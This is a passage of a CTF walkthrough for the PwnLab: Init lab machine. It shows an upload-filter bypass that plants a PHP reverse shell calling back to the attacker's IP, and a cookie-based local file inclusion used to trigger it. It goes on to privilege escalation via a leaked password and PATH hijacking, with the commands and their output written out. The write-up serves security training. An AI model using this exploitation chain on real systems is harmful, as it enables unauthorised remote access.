+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>move_uploaded_file<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">'file'</span>][<span style="color:#3ad900;font-weight:400">'tmp_name'</span>],&nbsp;<span style="color:#7f0044;font-weight:400">$uploadfile</span><span style="color:#ff9d00;font-weight:700">))</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                <span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;img&nbsp;src=\""</span>.<span style="color:#7f0044;font-weight:400">$uploadfile</span>.<span style="color:#3ad900;font-weight:400">"\"&gt;&lt;br&nbsp;/&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span>&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                die<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'Error&nbsp;4'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                <br>
+                ?&gt;<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;
+            </div>
+        </div><br>
+        <br>
+        There are 3 useful sections in here defining what our uploaded file must be.<br>
+        <br>
+        1. The file extension needs to be .jpg, .jpeg, .gif or .png<br>
+            <div class="codebox">
+                <span style="color:#7f0044;font-weight:400">$whitelist</span>&nbsp;=&nbsp;array<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">".jpg"</span>,<span style="color:#3ad900;font-weight:400">".jpeg"</span>,<span style="color:#3ad900;font-weight:400">".gif"</span>,<span style="color:#3ad900;font-weight:400">".png"</span><span style="color:#ff9d00;font-weight:700">);</span>&nbsp;<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(!(</span>in_array<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$file_ext</span>,&nbsp;<span style="color:#7f0044;font-weight:400">$whitelist</span><span style="color:#ff9d00;font-weight:700">)))</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                die<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'Not&nbsp;allowed&nbsp;extension,&nbsp;please&nbsp;upload&nbsp;images&nbsp;only.'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span>
+            </div>
+        </div><br>
+        <br>
+        2. The contents of the file has to actually be an image (I think)<br>
+        It'll read the header of what we upload to check that the file type is an image<br>
+            <div class="codebox">
+                <span style="color:#7f0044;font-weight:400">$filetype</span>&nbsp;&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">'file'</span>][<span style="color:#3ad900;font-weight:400">'type'</span>]<span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#ff9d00;font-weight:700">if(</span>strpos<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$filetype</span>,<span style="color:#3ad900;font-weight:400">'image'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;===&nbsp;<span style="color:#ff9d00;font-weight:700">false)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                die<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'Error&nbsp;001'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span>
+            </div>
+        </div><br>
+        <br>
+        3. And the Content-Type header in the POST request must be image/jpeg, image/jpg, image/gif or image/png<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">if(</span><span style="color:#7f0044;font-weight:400">$imageinfo</span>[<span style="color:#3ad900;font-weight:400">'mime'</span>]&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>=&nbsp;<span style="color:#3ad900;font-weight:400">'image/gif'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;&amp;</span>&nbsp;<span style="color:#7f0044;font-weight:400">$imageinfo</span>[<span style="color:#3ad900;font-weight:400">'mime'</span>]&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>=&nbsp;<span style="color:#3ad900;font-weight:400">'image/jpeg'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;&amp;</span>&nbsp;<span style="color:#7f0044;font-weight:400">$imageinfo</span>[<span style="color:#3ad900;font-weight:400">'mime'</span>]&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>=&nbsp;<span style="color:#3ad900;font-weight:400">'image/jpg'</span><span style="color:#ff9d00;font-weight:700">&amp;&amp;</span>&nbsp;<span style="color:#7f0044;font-weight:400">$imageinfo</span>[<span style="color:#3ad900;font-weight:400">'mime'</span>]&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>=&nbsp;<span style="color:#3ad900;font-weight:400">'image/png'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;die<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'Error&nbsp;002'</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;die<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'Not&nbsp;allowed&nbsp;extension,&nbsp;please&nbsp;upload&nbsp;images&nbsp;only.'</span><span style="color:#ff9d00;font-weight:700">);</span>
+            </div>
+        </div><br>
+        <br>
+        That's enough info to bypass the upload filter.<br>
+        <br>
+        First, prep the shell and rename it to a <code>.gif</code><br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>webshells<span style="color:#ff9d00;font-weight:700">/</span>php<span style="color:#ff9d00;font-weight:700">/</span>php-reverse-shell.php&nbsp;.<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;nano&nbsp;php-reverse-shell.php<br>
+                ...<br>
+                <span style="color:#ff9d00;font-weight:700">//</span>&nbsp;Usage<br>
+                <span style="color:#ff9d00;font-weight:700">//</span>&nbsp;-----<br>
+                <span style="color:#ff9d00;font-weight:700">//</span>&nbsp;See&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>pentestmonkey.net<span style="color:#ff9d00;font-weight:700">/</span>tools<span style="color:#ff9d00;font-weight:700">/</span>php-reverse-shell&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;you&nbsp;get&nbsp;stuck.<br>
+                set_time_limit&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#7f0044;font-weight:400">$VERSION</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"1.0"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$ip</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'192.168.1.183'</span><span style="color:#ff9d00;font-weight:700">;</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>&nbsp;CHANGE&nbsp;THIS<br>
+                <span style="color:#7f0044;font-weight:400">$port</span>&nbsp;=&nbsp;9001<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>&nbsp;CHANGE&nbsp;THIS<br>
+                <span style="color:#7f0044;font-weight:400">$chunk_size</span>&nbsp;=&nbsp;1400<span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$write_a</span>&nbsp;=&nbsp;null<span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$error_a</span>&nbsp;=&nbsp;null<span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$shell</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'uname&nbsp;-a;&nbsp;w;&nbsp;id;&nbsp;/bin/sh&nbsp;-i'</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$daemon</span>&nbsp;=&nbsp;0<span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$debug</span>&nbsp;=&nbsp;0<span style="color:#ff9d00;font-weight:700">;</span><br>
+                ...<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">mv</span>&nbsp;php-reverse-shell.php&nbsp;phprshell.gif
+            </div>
+        </div><br>
+        <br>
+        Navigate to <code>http://192.168.1.158/?page=upload</code><br>
+        1. F12 to open developer tools in Firefox &gt; navigate to the Network tab<br>
+        2. Capture a POST request by uploading your php shell on the website<br>
+        3. Now we have a POST request that we can edit. Select the POST request and click ‘Edit and Resend’<br>
+        4. Scroll down to the ‘Request Body’ and edit it.<br>
+        <br>
+        The shell's filename should end in <code>.gif</code><br>
+        The Content-Type should be <code>image/gif</code><br>
+        And your php script should start with the header of a gif file - <code>GIF89a;</code><br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Hit send (top right)<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        Your file should now be in /upload as a unique string - <code>http://192.168.1.158/upload/</code><br>
+        If not, something has gone wrong :shrug:<br>
+        Try again, this stuff is weird sometimes. I had multiple tries.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Activating the shell</strong></h2><br>
+        This is a pretty crappy part of the ctf to be honest.<br>
+        No hint or clue and a complete abandonment of logical next-steps. This is a ctf not a pentest, which is why i think this part is of poor design.<br>
+        <br>
+        If you try activate the shell you uploaded at /upload, you can't.<br>
+        You have to use a 2nd local file include vuln found in index.php.<br>
+        <br>
+        <code>http://192.168.1.158/?page=php://filter/convert.base64-encode/resource=index</code><br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4="</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d<br>
+                &lt;?php<br>
+                <span style="color:#ff9d00;font-weight:700">//</span>Multilingual.&nbsp;Not&nbsp;implemented&nbsp;yet.<br>
+                <span style="color:#ff9d00;font-weight:700">//</span>setcookie<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"lang"</span>,<span style="color:#3ad900;font-weight:400">"en.lang.php"</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>isset<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_COOKIE</span>[<span style="color:#3ad900;font-weight:400">'lang'</span>]<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">{</span><br>
+                include<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"lang/"</span>.<span style="color:#7f0044;font-weight:400">$_COOKIE</span>[<span style="color:#3ad900;font-weight:400">'lang'</span>]<span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                <span style="color:#ff9d00;font-weight:700">//</span>&nbsp;Not&nbsp;implemented&nbsp;yet.<br>
+                ?&gt;<br>
+                &lt;html&gt;<br>
+                &lt;<span style="color:#ff9d00;font-weight:700">head</span>&gt;<br>
+                &lt;title<span style="color:#ffdd00;font-weight:400">&gt;</span>PwnLab&nbsp;Intranet&nbsp;Image&nbsp;Hosting&lt;<span style="color:#ff9d00;font-weight:700">/</span>title&gt;<br>
+                &lt;<span style="color:#ff9d00;font-weight:700">/head</span>&gt;<br>
+                &lt;body&gt;<br>
+                &lt;center&gt;<br>
+                &lt;img&nbsp;src=<span style="color:#3ad900;font-weight:400">"images/pwnlab.png"</span>&gt;&lt;br&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&gt;<br>
+                [&nbsp;&lt;a&nbsp;href=<span style="color:#3ad900;font-weight:400">"/"</span>&gt;Home&lt;<span style="color:#ff9d00;font-weight:700">/</span>a&gt;&nbsp;]&nbsp;[&nbsp;&lt;a&nbsp;href=<span style="color:#3ad900;font-weight:400">"?page=login"</span>&gt;Login&lt;<span style="color:#ff9d00;font-weight:700">/</span>a&gt;&nbsp;]&nbsp;[&nbsp;&lt;a&nbsp;href=<span style="color:#3ad900;font-weight:400">"?page=upload"</span>&gt;Upload&lt;<span style="color:#ff9d00;font-weight:700">/</span>a&gt;&nbsp;]<br>
+                &lt;hr<span style="color:#ff9d00;font-weight:700">/</span>&gt;&lt;br<span style="color:#ff9d00;font-weight:700">/</span>&gt;<br>
+                &lt;?php<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>isset<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_GET</span>[<span style="color:#3ad900;font-weight:400">'page'</span>]<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">{</span><br>
+                include<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_GET</span>[<span style="color:#3ad900;font-weight:400">'page'</span>].<span style="color:#3ad900;font-weight:400">".php"</span><span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                <span style="color:#ff9d00;font-weight:700">else</span><br>
+                <span style="color:#ff9d00;font-weight:700">{</span><br>
+                <span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Use&nbsp;this&nbsp;server&nbsp;to&nbsp;upload&nbsp;and&nbsp;share&nbsp;image&nbsp;files&nbsp;inside&nbsp;the&nbsp;intranet"</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span><br>
+                ?&gt;<br>
+                &lt;<span style="color:#ff9d00;font-weight:700">/</span>center&gt;<br>
+                &lt;<span style="color:#ff9d00;font-weight:700">/</span>body&gt;<br>
+                &lt;<span style="color:#ff9d00;font-weight:700">/</span>html&gt;
+            </div>
+        </div><br>
+        <br>
+        There's a local file inclusion vulnerability in the language cookie for index.php.<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>isset<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_COOKIE</span>[<span style="color:#3ad900;font-weight:400">'lang'</span>]<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">{</span><br>
+                include<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"lang/"</span>.<span style="color:#7f0044;font-weight:400">$_COOKIE</span>[<span style="color:#3ad900;font-weight:400">'lang'</span>]<span style="color:#ff9d00;font-weight:700">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">}</span>
+            </div>
+        </div><br>
+        <br>
+        Start you listener<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        To activate the shell:<br>
+        1. F12 to open developer tools in firefox &gt; navigate to the Network tab<br>
+        2. Visit <code>http://192.168.1.158/index.php</code> and capture a GET request<br>
+        3. Select the GET request, click ‘Edit and Resend’ and set a <code>lang=</code> cookie to your uploaded shell in the ‘Request Headers'<br>
+            <div class="codebox">
+                Host<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;192.168.1.158<br>
+                User-Agent<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Mozilla<span style="color:#ff9d00;font-weight:700">/</span>5.0&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>X11<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;Linux&nbsp;i686<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;rv<span style="color:#ff9d00;font-weight:700">:</span>60.0<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;Gecko<span style="color:#ff9d00;font-weight:700">/</span>20100101&nbsp;Firefox<span style="color:#ff9d00;font-weight:700">/</span>60.0<br>
+                Accept<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;text<span style="color:#ff9d00;font-weight:700">/</span>html,application<span style="color:#ff9d00;font-weight:700">/</span>xhtml+xml,application<span style="color:#ff9d00;font-weight:700">/</span>xml<span style="color:#ff9d00;font-weight:700">;</span>q=0.9,*<span style="color:#ff9d00;font-weight:700">/</span>*<span style="color:#ff9d00;font-weight:700">;</span>q=0.8<br>
+                Accept-Language<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;en-US,en<span style="color:#ff9d00;font-weight:700">;</span>q=0.5<br>
+                Accept-Encoding<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">gzip</span>,&nbsp;deflate<br>
+                Cookie<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;lang=..<span style="color:#ff9d00;font-weight:700">/</span>upload<span style="color:#ff9d00;font-weight:700">/</span>dc50511dadc1c342f77e6602df3ae5c7.gif<br>
+                Connection<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;keep-alive<br>
+                Upgrade-Insecure-Requests<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1
+            </div>
+        </div><br>
+        <br>
+        Keep trying until you get it, I couldn't reliably do it. You'll get a callback on your listener at some point<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>pwnlabInit<span style="color:#ff9d00;font-weight:700">/</span>80http#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[192.168.1.183]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[192.168.1.158]&nbsp;57432<br>
+                Linux&nbsp;pwnlab&nbsp;3.16.0-4-686-pae&nbsp;<span style="color:#0088ff;font-weight:400">#1&nbsp;SMP&nbsp;Debian&nbsp;3.16.7-ckt20-1+deb8u4&nbsp;(2016-02-29)&nbsp;i686&nbsp;GNU/Linux</span><br>
+                &nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>44<span style="color:#ff9d00;font-weight:700">:</span>07&nbsp;up&nbsp;&nbsp;4<span style="color:#ff9d00;font-weight:700">:</span>46,&nbsp;&nbsp;0&nbsp;users,&nbsp;&nbsp;load&nbsp;average<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;0.24,&nbsp;0.13,&nbsp;0.09<br>
+                USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOGIN@&nbsp;&nbsp;&nbsp;IDLE&nbsp;&nbsp;&nbsp;JCPU&nbsp;&nbsp;&nbsp;PCPU&nbsp;WHAT<br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=33<span style="color:#ff9d00;font-weight:700">(</span>www-data<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh:</span>&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;can<span style="color:#3ad900;font-weight:400">'t&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                $&nbsp;</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) www-data -&gt; kane -&gt; mike</strong></h2><br>
+        Upgrade your shell and <code>su</code> to kane. Have a look at kane's files.<br>
+        <code>msgmike</code> is interesting<br>
+            <div class="codebox">
+                $&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;python<br>
+                $&nbsp;python&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'</span>&nbsp;<br>
+                www-data@pwnlab<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;6&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;21&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;..<br>
+                drwxr<span style="color:#ffdd00;font-weight:400">-x</span>---&nbsp;&nbsp;2&nbsp;john&nbsp;john&nbsp;4.0K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;john<br>
+                drwxr<span style="color:#ffdd00;font-weight:400">-x</span>---&nbsp;&nbsp;2&nbsp;kane&nbsp;kane&nbsp;4.0K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;kane<br>
+                drwxr<span style="color:#ffdd00;font-weight:400">-x</span>---&nbsp;&nbsp;2&nbsp;kent&nbsp;kent&nbsp;4.0K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;kent<br>
+                drwxr<span style="color:#ffdd00;font-weight:400">-x</span>---&nbsp;&nbsp;2&nbsp;mike&nbsp;mike&nbsp;4.0K&nbsp;Mar&nbsp;17&nbsp;&nbsp;2016&nbsp;mike<br>
+                www-data@pwnlab<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;kane<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;iSv5Ym2GRo<br>
+                <br>
+                kane@pwnlab<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;~&nbsp;&nbsp;&nbsp;<br>
+                kane@pwnlab<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                msgmike<br>
+                kane@pwnlab<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;msgmike<br>
+                msgmike<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;setuid,&nbsp;setgid&nbsp;ELF&nbsp;32-bit&nbsp;LSB&nbsp;executable,&nbsp;Intel&nbsp;80386,&nbsp;version&nbsp;1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>SYSV<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;dynamically&nbsp;linked,&nbsp;interpreter&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>ld-linux.so.2,&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">GNU</span>/Linux&nbsp;2.6.32,&nbsp;BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365,&nbsp;not&nbsp;stripped<br>
+                kane@pwnlab:~$&nbsp;./msgmike<br>
+                cat:&nbsp;/home/mike/msg.txt:&nbsp;No&nbsp;such&nbsp;file&nbsp;or&nbsp;directory
+            </div>
+        </div><br>
+        <br>
+        Looks like the <code>msgmike</code> binary tries to read <code>/home/mike/msg.txt</code><br>
+        Checking the strings for the binary, it's using <code>cat</code> but not by it's absolute path - at <code>/bin/cat</code><br>
+            <div class="codebox">
+                kane@pwnlab<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;strings&nbsp;msgmike<br>
+                ...<br>
+                <span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>mike<span style="color:#ff9d00;font-weight:700">/</span>msg.txt<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        This means we can make our own <code>cat</code> command using the PATH variable.<br>
+        A user's PATH variable tells the shell where to look for commands<br>
+        By putting <code>.</code> in your PATH, the shell will check the current directory for the binary first, and afterwards check everywhere else.<br>
+        <br>
+        So first we edit our path to include <code>.</code> (at the start)<br>
+        <code>export PATH=.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code><br>
+        <br>
+        Second we move to /tmp and write our own <code>cat</code> command (spawning a shell)<br>
+        <code>cd /tmp</code><br>
+        <code>echo "/bin/sh" &gt; cat</code><br>
+        <br>
+        And lastly we execute our custom <code>cat</code> command as mike using the <code>msgmike</code> binary to get a shell as mike.<br>
+        <code>/home/kane/msgmike</code><br>
+        <br>
+            <div class="codebox">
